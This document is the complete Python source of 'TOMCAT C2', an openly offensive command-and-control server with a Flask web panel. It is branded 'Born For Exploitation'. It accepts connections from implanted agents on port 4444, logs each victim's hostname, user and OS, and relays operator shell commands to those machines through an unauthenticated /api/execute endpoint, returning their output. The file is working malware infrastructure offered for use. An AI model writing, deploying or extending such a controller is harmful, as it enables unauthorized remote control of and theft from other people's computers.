#!/usr/bin/env python3
"""
TOMCAT C2 Flask Web Server (Pure - No External JS)
Author: TOM7
GitHub: tom7voldemort
"""

try:
    import base64
    import json
    import os
    import socket
    import sys
    import threading
    import time
    import traceback
    from datetime import datetime
    from flask import Flask, render_template, request, jsonify
    from cryptography.fernet import Fernet
except ModuleNotFoundError as e:
    print(f"REQUIRED MODULES NOT INSTALLED: {e}")
    print("Install with: pip install flask cryptography")
    sys.exit(0)


class C2TomcatFlask:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.agents = {}
        self.agentId = 0
        self.c2socket = None
        self.running = False
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.lock = threading.Lock()
        self.accept_thread = None

    def C2StartTomcat(self):
        try:
            self.c2socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.c2socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.c2socket.bind((self.host, self.port))
            self.c2socket.listen(5)
            self.running = True
            return True, f"Server Started On {self.host}:{self.port}"
        except Exception as e:
            return False, f"Error Starting Server: {str(e)}"

    def C2StopTomcat(self):
        self.running = False

        if self.c2socket:
            try:
                self.c2socket.close()
            except Exception:
                pass
        
        if self.accept_thread and self.accept_thread.is_alive():
            self.accept_thread.join(timeout=2)
        
        agents_to_close = []
        with self.lock:
            agents_to_close = list(self.agents.items())
        
        for agentId, agent in agents_to_close:
            try:
                agent["socket"].close()
            except Exception:
                pass
        
        with self.lock:
            self.agents.clear()

    def acceptConnection(self):
        while self.running:
            try:
                self.c2socket.settimeout(1.0)
                agentSocket, address = self.c2socket.accept()
                thread = threading.Thread(
                    target=self.agentHandler,
                    args=(agentSocket, address),
                    daemon=True,
                )
                thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"Accept Error: {str(e)}")

    def agentHandler(self, agentSocket, address):
        current_agent_id = None
        try:
            agentSocket.settimeout(10)
            agentSocket.sendall(self.key)
            time.sleep(0.2)
            agentInfo = agentSocket.recv(4096).decode("utf-8")
            if not agentInfo:
                agentSocket.close()
                return
            
            info = json.loads(agentInfo)
            with self.lock:
                self.agentId += 1
                current_agent_id = self.agentId
                agentData = {
                    "socket": agentSocket,
                    "address": address,
                    "id": self.agentId,
                    "os": info.get("os", "Unknown"),
                    "hostname": info.get("hostname", "Unknown"),
                    "user": info.get("user", "Unknown"),
                    "arch": info.get("architecture", "Unknown"),
                    "joinAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                self.agents[self.agentId] = agentData
            
            print(f"[+] New agent connected: {current_agent_id}")
            self.monitorAgent(current_agent_id, agentSocket)
            
        except Exception as e:
            print(f"Handshake Error: {str(e)}")
            traceback.print_exc()
            try:
                agentSocket.close()
            except Exception:
                pass
            if current_agent_id:
                self.agentRefused(current_agent_id)

    def monitorAgent(self, agentId, agentSocket):
        try:
            while self.running:
                agentSocket.settimeout(5.0)
                try:
                    data = agentSocket.recv(1, socket.MSG_PEEK)
                    if not data:
                        raise ConnectionError("Agent disconnected")
                except socket.timeout:
                    continue
                except Exception:
                    raise
                
                time.sleep(1)
                
        except Exception as e:
            print(f"[!] Agent {agentId} disconnected: {str(e)}")
            self.agentRefused(agentId)

    def agentAvailable(self, agentId, command):
        if agentId not in self.agents:
            return False, "Agent Not Found."
        try:
            agent = self.agents[agentId]
            agentSocket = agent["socket"]
            encrypted = self.cipher.encrypt(command.encode())
            agentSocket.settimeout(120)
            agentSocket.sendall(encrypted)
            recdata = b""
            starttime = time.time()
            while True:
                try:
                    if time.time() - starttime > 120:
                        return False, "Command execution timeout (120s)"
                    chunk = agentSocket.recv(8192)
                    if not chunk:
                        raise ConnectionError("Agent disconnected during command")
                    recdata += chunk
                    if recdata.endswith(b"<END>"):
                        recdata = recdata[:-5]
                        break
                except socket.timeout:
                    if recdata:
                        break
                    else:
                        return False, "No Response From Agent (timeout)"
            if recdata:
                try:
                    decrypted = self.cipher.decrypt(recdata).decode(
                        "utf-8", errors="ignore"
                    )
                    return True, decrypted
                except Exception as e:
                    return False, f"Decryption Error: {str(e)}"
            else:
                return False, "No Response From Agent"
        except (ConnectionResetError, ConnectionError, BrokenPipeError) as e:
            self.agentRefused(agentId)
            return False, f"Connection lost: {str(e)}"
        except Exception as e:
            self.agentRefused(agentId)
            traceback.print_exc()
            return False, f"Error: {str(e)}"

    def agentRefused(self, agentId):
        with self.lock:
            if agentId in self.agents:
                try:
                    self.agents[agentId]["socket"].close()
                except Exception:
                    pass
                del self.agents[agentId]

    def agentList(self):
        with self.lock:
            agents = []
            for agent in self.agents.values():
                agents.append({
                    "id": agent["id"],
                    "ip": f"{agent['address'][0]}:{agent['address'][1]}",
                    "os": agent["os"],
                    "hostname": agent["hostname"],
                    "user": agent["user"],
                    "arch": agent["arch"],
                    "joinAt": agent["joinAt"]
                })
            return agents


# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = 'tomcat-c2-secret-key-change-me'

# Initialize C2 server
c2_server = None


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/start', methods=['POST'])
def api_start():
    global c2_server
    try:
        data = request.get_json()
        host = data.get('host', '0.0.0.0')
        port = int(data.get('port', 4444))
        
        if c2_server and c2_server.running:
            return jsonify({'success': False, 'message': 'Server is already running'})
        
        c2_server = C2TomcatFlask(host, port)
        success, message = c2_server.C2StartTomcat()
        
        if success:
            c2_server.accept_thread = threading.Thread(
                target=c2_server.acceptConnection,
                daemon=True
            )
            c2_server.accept_thread.start()
            
            return jsonify({
                'success': True,
                'message': message,
                'key': c2_server.key.decode(),
                'host': host,
                'port': port
            })
        else:
            return jsonify({'success': False, 'message': message})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})


@app.route('/api/stop', methods=['POST'])
def api_stop():
    global c2_server
    try:
        if c2_server:
            c2_server.C2StopTomcat()
            c2_server = None
            return jsonify({'success': True, 'message': 'Server stopped successfully'})
        else:
            return jsonify({'success': False, 'message': 'No server running'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})


@app.route('/api/status', methods=['GET'])
def api_status():
    global c2_server
    if c2_server and c2_server.running:
        return jsonify({
            'running': True,
            'host': c2_server.host,
            'port': c2_server.port,
            'agent_count': len(c2_server.agents)
        })
    else:
        return jsonify({'running': False, 'agent_count': 0})


@app.route('/api/agents', methods=['GET'])
def api_agents():
    global c2_server
    if c2_server:
        agents = c2_server.agentList()
        return jsonify({'agents': agents})
    else:
        return jsonify({'agents': []})


@app.route('/api/execute', methods=['POST'])
def api_execute():
    global c2_server
    try:
        if not c2_server:
            return jsonify({'success': False, 'message': 'Server not running'})
        
        data = request.get_json()
        agent_id = int(data.get('agent_id'))
        command = data.get('command', '').strip()
        
        if not command:
            return jsonify({'success': False, 'message': 'Command cannot be empty'})
        
        success, response = c2_server.agentAvailable(agent_id, command)
        
        if success:
            return jsonify({
                'success': True,
                'output': response,
                'agent_id': agent_id,
                'command': command
            })
        else:
            return jsonify({
                'success': False,
                'message': response,
                'agent_id': agent_id,
                'command': command
            })
    except Exception as e:
        return jsonify({'success': False, 'message': f'Failed to execute: {str(e)}'})


def main():
    print("""
    ___________________      _____  _________     ________________ _________  ________
    \\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/ \\_   ___ \\ \\_____  \\
      |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |    /    \\  \\/  /  ____/
      |    |   /    |    \\/    Y    \\     \\____/    |    \\    |    \\     \\____/       \\
      |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|     \\______  /\\_______ \\
                       \\/         \\/        \\/         \\/                  \\/         \\/
            ~>> Author: TOM7
            ~>> GitHub: tom7voldemort
            ~>> Born For Exploitation
            ~>> Flask Web Interface (Pure JS)
    """)
    print("\n[+] Starting TOMCAT C2 Flask Server...")
    print("[+] Access the web interface at: http://127.0.0.1:5000")
    print("[+] Press Ctrl+C to stop\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)


if __name__ == "__main__":
    main()